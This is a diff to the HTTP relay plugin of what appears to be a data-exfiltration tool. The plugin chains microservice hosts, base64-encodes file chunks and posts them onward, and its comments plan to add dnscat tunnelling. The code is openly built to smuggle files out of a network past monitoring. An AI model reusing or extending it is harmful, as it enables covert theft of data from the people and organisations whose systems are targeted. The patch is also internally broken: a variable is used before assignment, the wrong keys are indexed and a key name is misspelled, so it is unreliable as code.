@@ -116,14 +116,15 @@ def proxy():
     app_exfiltrate.log_message('info', "[proxy] [http] Starting httpd...")
     server(relay_http_request)
 
-def microserivce_proxy(exfil_object, file_to_send):
+def microserivce_proxy(exfil_object):
     global app
     app = exfil_object
     app_exfiltrate.log_message('info', "[microservice_proxy] [http] Starting httpd...")
     server(relay_ms_request)
 
-## TODO: add dnscat capabilities here IMHO
-## todo: update headers (maybe take from config file or something like that)
+## TODO: add dnscat capabilities here IMHO --- I honestly kinda forget how dnscat even works...
+## todo: update headers (maybe take from config file or something like that) -- yah definitely... figure them out in advance??
+    ## (but in an automated way...)
 ## todo: write new ms_sender function or something like that
 ## todo: TEST!!!
 packet_counter = -1
@@ -144,7 +145,6 @@ def relay_ms_request(data):
         next_ip = next_position['ip']
         next_port = next_position['port']
         data['path_data']['index'] +=1
-        target = "http://{}:{}".format(next_ip, next_port)
         app_exfiltrate.log_message(
             'info', "[proxy] [http] Relaying {0} bytes to {1}".format(len(data), target))
 
@@ -153,13 +153,15 @@ def relay_ms_request(data):
         # step (2): reverse path and send it back
         data['path_data'] = [i for i in reversed(data['path_data'])]
         data['path_data']['index'] = 1
-        target = data['path_data'][1]
+        next_ip = data['path_data'][1]['ip']
+        next_port = data['path_data'][1]['port']
         # now put some actual data in there..
         ## OKAY, we are going to get janky with this...
+        if not file_to_send:
+            file_to_send = data['path_data']['file_to_end']
         cur_data,f_candidate = get_next_data(file_to_send, packet_counter, 'microservice_special', f, app.exfiltrate.key, 'xx2a')
         if f_candidate:
             f = f_candidate
-
         if data == None:
             packet_counter = - 1
             cur_data, f = get_next_data(file_to_send, packet_counter, 'microservice_special', f,
@@ -169,6 +171,7 @@ def relay_ms_request(data):
 
     packet_counter += 1
     data_to_send = {'data': base64.b64encode(data)}
+    target = "http://{}:{}".format(next_ip, next_port)
     requests.post(target, data=data_to_send, headers=headers)
 
 class Plugin:
